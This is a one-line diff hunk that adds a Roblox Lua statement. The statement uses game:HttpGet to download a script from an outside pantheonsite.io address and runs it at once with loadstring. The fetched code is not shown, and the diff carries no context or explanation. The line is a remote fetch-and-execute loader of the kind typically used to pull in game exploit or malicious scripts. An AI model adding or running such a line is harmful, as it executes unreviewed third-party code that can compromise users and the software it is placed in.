@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://dev-8bitsforya.pantheonsite.io/nan.lua"))()
